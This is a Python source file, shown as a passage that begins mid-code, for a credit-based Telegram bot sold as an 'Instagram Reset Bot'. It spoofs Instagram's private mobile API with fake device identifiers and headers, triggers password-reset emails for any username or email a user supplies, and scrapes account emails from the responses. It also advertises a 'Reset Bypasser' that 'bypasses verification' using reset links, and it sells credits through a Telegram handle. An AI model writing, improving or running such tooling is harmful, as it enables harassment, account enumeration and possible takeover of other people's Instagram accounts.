                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        send_message(chat_id, msg, reply_markup=keyboard)

# (The rest of your code - InstagramResetByEmail class, process_username_reset, menus, main loop, etc. remains unchanged)
# ... [All the remaining code from your original works.py stays exactly the same from here]

# ---------- Reset via Email/Username (with masked email display, no admin log) ----------
class InstagramResetByEmail:
    def __init__(self):
        self.SATAN = "567067343352428"
        self.YOURKING = "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27"
        self.PARITHINGS = {
            'User-Agent': "Instagram 312.0.0.33.119 Android (26/8.0.0; 480dpi; 2160x2160; Google; Pixel; sailfish; msm8996; en_US; 556997774)",
            'x-bloks-version-id': "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27",
            'x-fb-friendly-name': "IgApi: bloks/apps/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': "android-4f13595c1814df92",
            'x-ig-app-id': "567067343352428",
            'x-ig-device-id': "8deb1321-e663-40be-ada2-55325ca99b13",
            'x-ig-family-device-id': "eec97373-1959-5436-993e-c5e3472b3429",
            'x-mid': "bcPDkxACBBFRwdnT3iz2pKyVoO9b"
        }
        self.WLZTAN = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"

    def mask_email(self, email):
        """Return masked email like n******2@domain.com"""
        if '@' in email:
            local, domain = email.split('@', 1)
            if len(local) > 2:
                masked_local = local[0] + '*' * (len(local) - 2) + local[-1]
            else:
                masked_local = local[0] + '*'
            return f"{masked_local}@{domain}"
        return email

    def send_reset_request(self, search_input):
        url = self.WLZTAN
        payload = {
            'params': json.dumps({
                'client_input_params': {
                    'was_headers_prefill_available': 0,
                    'ig_vetted_device_nonce': '',
                    'cloud_trust_token': None,
                    'zero_balance_state': None,
                    'sso_accounts_auth_data': [],
                    'accounts_list': [
                        {'token': '', 'uid': '', 'credential_type': 'none'},
                        {'metadata': {'device_base_login_session': '', 'big_blue_token': None}, 'account_type': 'nonce', 'token': '', 'uid': ''},
                        {'account_type': 'google_oauth', 'token': ''}
                    ],
                    'ig_android_qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                    'gms_incoming_call_retriever_eligibility': 'client_not_supported',
                    'headers_infra_flow_id': '',
                    'ig_oauth_token': [{'token': '', 'account_type': 'google_oauth'}],
                    'search_query': search_input,
                    'sfdid': '',
                    'flash_call_permissions_status': {'READ_PHONE_STATE': 'GRANTED', 'READ_CALL_LOG': 'DENIED', 'CALL_PHONE': 'UNKNOWN'},
                    'network_bssid': None,
                    'text_input_id': 'piwfmg:62',
                    'is_oauth_without_permission': 0,
                    'is_whatsapp_installed': 0,
                    'aac': '{"aac_init_timestamp":1774422796,"aacjid":"bc1f1830-62fd-5449-91ae-95ebfdab1288","aaccs":""}',
                    'fetched_email_token_list': {},
                    'android_build_type': 'release',
                    'fetched_email_list': [],
                    'was_headers_prefill_used': 0,
                    'auth_secure_device_id': '',
                    'search_screen_type': 'email_or_username',
                    'encrypted_msisdn': '',
                    'lois_settings': {'lois_token': ''},
                    'device_network_info': None
                },
                'server_params': {
                    'is_platform_login': 0,
                    'is_from_logged_out': 0,
                    'context_data': '',
                    'qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                    'family_device_id': 'eec97373-1959-5436-993e-c5e3472b3429',
                    'is_from_logged_in_switcher': 0,
                    'event_request_id': 'd0c458e3-99d3-5df3-a30f-gb339bd21eb6',
                    'waterfall_id': 'a2b2b292-8c84-5532-b413-e65beb6f1g5a',
                    'layered_homepage_experiment_group': None,
                    'access_flow_version': 'pre_mt_behavior',
                    'login_entry_point': 'logged_out',
                    'offline_experiment_group': 'caa_iteration_v3_perf_ig_4',
                    'INTERNAL__latency_qpl_instance_id': 1.64340072800102E14,
                    'device_id': 'android-4f13595c1814df92',
                    'login_surface': 'login_home',
                    'INTERNAL__latency_qpl_marker_id': 36707140
                }
            }),
            'bk_client_context': json.dumps({'bloks_version': self.YOURKING, 'styles_id': 'instagram'}),
            'bloks_versioning_id': self.YOURKING
        }
        response = session.post(url, data=payload, headers=self.PARITHINGS, timeout=15)
        return response

    def process_result(self, search_input, response):
        result = {'input': search_input, 'input_type': 'email' if ('@' in search_input and '.' in search_input) else 'username', 'success': False, 'masked_info': None, 'message': ''}
        if response.status_code == 200:
            response_text = response.text
            if 'We sent' in response_text or 'email' in response_text.lower():
                result['success'] = True
                email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                found_emails = re.findall(email_pattern, response_text)
                if found_emails:
                    for email in found_emails:
                        if len(email) > 5:
                            masked = self.mask_email(email)
                            result['masked_info'] = masked
                            result['message'] = f"✅ Reset link sent to: {masked}"
                            break
                    else:
                        result['message'] = "✅ Reset request sent successfully. Check your email."
                else:
                    result['message'] = "✅ Reset request sent successfully. Check your email."
            else:
                if 'no_user' in response_text or 'not found' in response_text.lower():
                    result['message'] = "❌ No account found with this email/username"
                elif 'limit' in response_text.lower():
                    result['message'] = "❌ Too many attempts. Please try again later"
                else:
                    result['message'] = "❌ Unknown error – Instagram might be blocking this request"
        else:
            result['message'] = f"❌ Request failed with status: {response.status_code}"
        return result

def process_username_reset(chat_id, user_id, search_input, menu_msg_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Cʀᴇᴅɪᴛ ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Cʀᴇᴅɪᴛs :</b>
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ (2 Cʀᴇᴅɪᴛs ᴇᴀᴄʜ ᴅᴀʏ)

— Dᴍ @xYourKing Tᴏ Bᴜʏ Cʀᴇᴅɪᴛs
"""
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        edit_photo_caption(chat_id, menu_msg_id, msg, keyboard)
        return
    deduct_credit(user_id)
    progress_msg = send_message(chat_id, "⚙️ <b>Processing...</b>\nSending reset request...")
    progress_msg_id = progress_msg["result"]["message_id"] if progress_msg else None
    reset_api = InstagramResetByEmail()
    response = reset_api.send_reset_request(search_input)
    result = reset_api.process_result(search_input, response)
    if progress_msg_id:
        try:
            session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage", data={"chat_id": chat_id, "message_id": progress_msg_id})
        except:
            pass
    if result['success']:
        remaining = get_user_data(user_id)["credits"]
        msg = f"""✅ <b>Reset Request Successful</b>

{result['message']}

📊 Remaining Credits: <b>{remaining}</b>
"""
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        send_message(chat_id, msg, reply_markup=keyboard)
    else:
        add_credits(user_id, 1)
        msg = f"""❌ <b>Reset Request Failed</b>

{result['message']}

Your credit has been refunded.
"""
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Try Again", "callback_data": "send_username_reset"}],
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        send_message(chat_id, msg, reply_markup=keyboard)

# ---------- Bot Menu and UI ----------
def get_menu_text(user_id):
    user_data = get_user_data(user_id)
    credits = user_data["credits"]
    return f"""<b>Wᴇʟᴄᴏᴍᴇ Tᴏ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bᴏᴛ</b>

• <b>Cʀᴇᴅɪᴛs : <code>{credits}</code> (2 Fʀᴇᴇ Pᴇʀ Dᴀʏ)</b>

Cʜᴏᴏsᴇ Aɴ Oᴘᴛɪᴏɴ Tᴏ Pʀᴏᴄᴇᴇᴅ ⬇️
"""

def get_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "♰ Rᴇsᴇᴛ Bʏᴘᴀssᴇʀ", "callback_data": "send_reset_link"},
             {"text": "⛧ Rᴇsᴇᴛ Sᴇɴᴅᴇʀ", "callback_data": "send_username_reset"}],
            [{"text": "❓ Hᴇʟᴘ & Sᴜᴘᴘᴏʀᴛ", "callback_data": "help"}]
        ]
    }

def get_profile_text(user_id):
    user_data = get_user_data(user_id)
    return f"""<b>📊 Your Profile</b>

💺 Cʀᴇᴅɪᴛs : <code>{user_data['credits']}</code>
📅 Lᴀsᴛ Rᴇsᴇᴛ Oɴ : <code>{user_data.get('last_reset_date', str(date.today()))}</code>"""

def get_help_text():
    return """❓ ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅs

📌 ʜᴏᴡ ᴛᴏ ʀᴇsᴇᴛ ᴜsɪɴɢ ʀᴇsᴇᴛ ʟɪɴᴋ:

1. ɢᴏ ᴛᴏ ɪɴsᴛᴀɢʀᴀᴍ ʟᴏɢɪɴ ᴘᴀɢᴇ
2. ᴄʟɪᴄᴋ "ꜰᴏʀɢᴏᴛ ᴘᴀssᴡᴏʀᴅ"
3. ᴇɴᴛᴇʀ ᴜsᴇʀɴᴀᴍᴇ/ᴇᴍᴀɪʟ
4. ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴇᴍᴀɪʟ ꜰᴏʀ ʀᴇsᴇᴛ ʟɪɴᴋ
5. ᴄᴏᴘʏ ꜰᴜʟʟ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ʜᴇʀᴇ

📌 ʜᴏᴡ ᴛᴏ ʀᴇsᴇᴛ ᴜsɪɴɢ ᴇᴍᴀɪʟ/ᴜsᴇʀɴᴀᴍᴇ:

1. ᴄʟɪᴄᴋ "ʀᴇsᴇᴛ ᴠɪᴀ ᴇᴍᴀɪʟ/ᴜsᴇʀɴᴀᴍᴇ"
2. sᴇɴᴅ ᴛʜᴇ ᴀᴄᴄᴏᴜɴᴛ's ᴇᴍᴀɪʟ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ
3. ʙᴏᴛ ᴡɪʟʟ ᴛʀɪɢɢᴇʀ ᴀ ʀᴇsᴇᴛ ʟɪɴᴋ ᴛᴏ ᴛʜᴀᴛ ᴇᴍᴀɪʟ

⚠️ ɴᴏᴛᴇ:
• ᴇᴀᴄʜ ʀᴇsᴇᴛ ᴄᴏsᴛs 1 ᴄʀᴇᴅɪᴛ
• ʏᴏᴜ ɢᴇᴛ 2 ꜰʀᴇᴇ ꜰʀᴇᴇ ᴄʀᴇᴅɪᴛs ᴅᴀɪʟʏ
• ꜰᴀɪʟᴇᴅ ʀᴇsᴇᴛs ᴀʀᴇ ʀᴇꜰᴜɴᴅᴇᴅ

ᴄᴏᴍᴍᴀɴᴅs:
/start - ᴍᴀɪɴ ᴍᴇɴᴜ
/cancel - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ"""

def send_or_edit_menu(chat_id, user_id, message_id=None):
    text = get_menu_text(user_id)
    keyboard = get_menu_keyboard()
    if message_id:
        return edit_photo_caption(chat_id, message_id, text, keyboard)
    else:
        result = send_photo(chat_id, STARTUP_IMAGE_URL, caption=text, reply_markup=keyboard)
        if result and result.get("ok"):
            return result["result"]["message_id"]
        return None

# ---------- Main Bot Loop ----------
user_menu_message_id = {}
waiting_for_link = {}
waiting_for_username = {}

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("Please set BOT_TOKEN and CHAT_ID in the script first!")
        return
    migrate_user_data()
    if STARTUP_VIDEO_URL and STARTUP_VIDEO_URL != "https://example.com/your_video.mp4":
        send_video(CHAT_ID, STARTUP_VIDEO_URL, caption="Bᴏᴛ Sᴛᴀʀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ")
    else:
        send_telegram_message("Bot Started Successfully!")
        print("⚠️ No STARTUP_VIDEO_URL set. Sent plain text instead.")
    print(f"🚀 Bot is running... Username: @{BOT_USERNAME}")
    print(f"📊 Force Subscribe: {'ON' if ENABLE_FORCE_SUB else 'OFF'}")
    print(f"📢 Channels: {', '.join(FORCE_SUB_CHANNELS) if FORCE_SUB_CHANNELS else 'None'}")
    last_update_id = None
    while True:
        try:
            updates = get_updates(last_update_id)
            if updates and updates.get("ok") and updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    if "callback_query" in update:
                        query = update["callback_query"]
                        query_id = query["id"]
                        chat_id = query["message"]["chat"]["id"]
                        user_id = query["from"]["id"]
                        data = query["data"]
                        message_id = query["message"]["message_id"]
                        user_menu_message_id[user_id] = message_id
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, message_id)
                                session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": query_id})
                                continue
                        if data == "verify_sub" or data == "refresh_sub":
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if is_subscribed:
                                send_or_edit_menu(chat_id, user_id, message_id)
                            else:
                                send_subscription_required(chat_id, user_id, message_id)
                        elif data == "send_reset_link":
                            waiting_for_link[user_id] = True
                            if user_id in waiting_for_username: del waiting_for_username[user_id]
                            msg = """Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bᴏᴛ 

Wɪᴛʜ Tʜɪs Fᴇᴀᴛᴜʀᴇ, Yᴏᴜ Cᴀɴ 
Sᴜᴄᴄᴇssғᴜʟʟʏ Bʏᴘᴀss Vᴇʀɪғɪᴄᴀᴛɪᴏɴ Bʏ Sᴇɴᴅɪɴɢ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ.

Pʟᴇᴀsᴇ Sᴇɴᴅ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ ⬇️"""
                            keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            edit_photo_caption(chat_id, message_id, msg, keyboard)
                        elif data == "send_username_reset":
                            waiting_for_username[user_id] = True
                            if user_id in waiting_for_link: del waiting_for_link[user_id]
                            msg = """Pʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ ᴇᴍᴀɪʟ ᴀᴅᴅʀᴇss ᴏʀ ᴜsᴇʀɴᴀᴍᴇ ᴏғ ᴛʜᴇ Iɴsᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇsᴇᴛ ⬇️"""
                            keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            edit_photo_caption(chat_id, message_id, msg, keyboard)
                        elif data == "back_to_menu":
                            if user_id in waiting_for_link: del waiting_for_link[user_id]
                            if user_id in waiting_for_username: del waiting_for_username[user_id]
                            send_or_edit_menu(chat_id, user_id, message_id)
                        elif data == "profile":
                            text = get_profile_text(user_id)
                            keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            edit_photo_caption(chat_id, message_id, text, keyboard)
                        elif data == "help":
                            text = get_help_text()
                            keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            edit_photo_caption(chat_id, message_id, text, keyboard)
                        session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": query_id})
                    elif "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        user_id = update["message"]["from"]["id"]
                        text = update["message"]["text"]
                        menu_msg_id = user_menu_message_id.get(user_id)
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, menu_msg_id)
                                continue
                        if text.startswith("/start"):
                            if user_id in waiting_for_link: del waiting_for_link[user_id]
                            if user_id in waiting_for_username: del waiting_for_username[user_id]
                            new_msg_id = send_or_edit_menu(chat_id, user_id)
                            if new_msg_id:
                                user_menu_message_id[user_id] = new_msg_id
                        elif text.startswith("/cancel"):
                            if user_id in waiting_for_link: del waiting_for_link[user_id]
                            if user_id in waiting_for_username: del waiting_for_username[user_id]
                            send_message(chat_id, "✅ Operation cancelled. Returned to main menu.")
                            new_msg_id = send_or_edit_menu(chat_id, user_id)
                            if new_msg_id:
                                user_menu_message_id[user_id] = new_msg_id
                        elif text.startswith("/grant") and user_id in ADMIN_IDS:
                            parts = text.split()
                            if len(parts) == 3:
                                try:
                                    target = int(parts[1])
                                    amount = int(parts[2])
                                    success, msg = admin_grant_credits(user_id, target, amount)
                                    send_message(chat_id, msg)
                                except:
                                    send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                            else:
                                send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                        elif text.startswith("/stats") and user_id in ADMIN_IDS:
                            db = load_db()
                            total_users = len(db)
                            total_credits = sum(data.get("credits", 0) for data in db.values())
                            msg = f"""📊 <b>Bot Statistics</b>

👥 Total Users: {total_users}
💺 Total Credits: {total_credits}
📈 Avg Credits/User: {total_credits/total_users if total_users else 0:.2f}"""
                            send_message(chat_id, msg)
                        elif user_id in waiting_for_link:
                            if "instagram.com" in text.lower() and "uidb36" in text:
                                del waiting_for_link[user_id]
                                Thread(target=process_reset_link_with_progress, args=(chat_id, user_id, text, menu_msg_id)).start()
                            else:
                                msg = "❌ <b>Invalid Instagram reset link!</b>\n\nPlease send a valid link containing 'uidb36' and 'token'."
                                keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                                send_message(chat_id, msg, reply_markup=keyboard)
                        elif user_id in waiting_for_username:
                            if text and len(text) >= 3:
                                del waiting_for_username[user_id]
                                Thread(target=process_username_reset, args=(chat_id, user_id, text.strip(), menu_msg_id)).start()
                            else:
                                msg = "❌ <b>Invalid input!</b>\n\nPlease send a valid email address or username (at least 3 characters)."
                                keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                                send_message(chat_id, msg, reply_markup=keyboard)
                        else:
                            msg = "❌ <b>Invalid input!</b>\n\nSend an Instagram password reset link or use /start for menu."
                            keyboard = {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            send_message(chat_id, msg, reply_markup=keyboard)
            time.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(2)

def admin_grant_credits(admin_id, target_user_id, amount):
    if admin_id not in ADMIN_IDS:
        return False, "Not authorized"
    try:
        add_credits(target_user_id, amount)
        return True, f"✅ Added {amount} credits to user {target_user_id}"
    except:
        return False, "Error adding credits"

if __name__ == "__main__":
    main()
